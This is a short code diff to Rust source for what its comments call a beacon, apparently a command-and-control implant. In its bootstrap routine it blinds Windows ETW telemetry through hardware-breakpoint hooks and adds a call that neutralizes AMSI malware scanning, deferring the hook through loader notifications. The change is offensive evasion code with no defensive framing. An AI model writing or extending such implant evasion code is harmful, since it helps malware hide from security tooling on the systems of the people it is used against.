@@ -144,7 +144,7 @@ unsafe fn bootstrap() -> Option<Instance> {
     // ETW blinding: resolve the hook targets and the VEH installer, then
     // install the handler and arm the debug registers. Any failure simply
     // leaves the hooks disabled — the beacon keeps running.
-    let (etw_hooks, add_veh) = beacon_hwbp::etw_hooks(ntdll, kernel32);
+    let (mut etw_hooks, add_veh) = beacon_hwbp::etw_hooks(ntdll, kernel32);
     if add_veh != 0
         && syscall_table.get_ctx_ssn != u32::MAX
         && syscall_table.set_ctx_ssn != u32::MAX
@@ -156,6 +156,10 @@ unsafe fn bootstrap() -> Option<Instance> {
             ) -> *mut core::ffi::c_void);
         beacon_hwbp::install(&syscall_table, &etw_hooks, add_veh);
     }
+
+    // AMSI neutralization: hook now if amsi.dll is mapped, defer the rest
+    // through loader notifications (Dr3 — the ETW hooks left it free).
+    crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
 
     // Seed the jitter RNG from the performance counter; a failed read falls
     // back to the remapped zero seed (never zero-stuck).
